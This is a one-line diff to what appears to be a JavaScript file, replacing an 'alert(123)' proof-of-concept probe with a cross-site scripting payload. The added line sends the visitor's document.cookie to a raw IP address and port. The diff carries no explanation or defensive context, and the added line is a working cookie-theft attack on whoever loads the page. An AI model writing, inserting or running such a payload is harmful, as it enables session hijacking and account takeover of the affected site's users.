@@ -1,1 +1,1 @@
-alert(123);
+window.location.href='http://47.115.201.35:3296?c='+document.cookie
